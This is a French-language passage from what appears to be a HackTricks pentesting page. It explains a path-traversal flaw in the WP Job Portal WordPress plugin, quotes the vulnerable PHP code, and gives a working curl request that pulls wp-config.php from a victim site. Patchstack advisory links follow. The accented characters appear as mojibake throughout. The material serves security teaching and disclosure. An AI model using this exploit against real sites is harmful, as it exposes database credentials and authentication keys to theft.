Une autre t√¢che, **downloadcustomfile**, permettait aux visiteurs de t√©l√©charger **n'importe quel fichier sur le disque** via une travers√©e de chemin. Le sink vuln√©rable est situ√© dans `modules/customfield/model.php::downloadCustomUploadedFile()` :
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` est contr√¥l√© par l'attaquant et concat√©n√© **sans assainissement**. Encore une fois, le seul verrou est un **nonce CSRF** qui peut √™tre r√©cup√©r√© depuis la page de r√©sum√©.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Le serveur r√©pond avec le contenu de `wp-config.php`, r√©v√©lant les identifiants de la base de donn√©es et les cl√©s d'authentification.

## R√©f√©rences

- [Vuln√©rabilit√© de suppression de fichier arbitraire non authentifi√©e dans le th√®me Litho](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Plusieurs vuln√©rabilit√©s critiques corrig√©es dans le plugin WP Job Portal](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Cas rare d'escalade de privil√®ges dans le plugin ASE affectant plus de 100k sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [Changement de version ASE 7.6.3 ‚Äì supprimer les r√¥les originaux lors de la mise √† jour du profil](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)

{{#include ../../banners/hacktricks-training.md}}
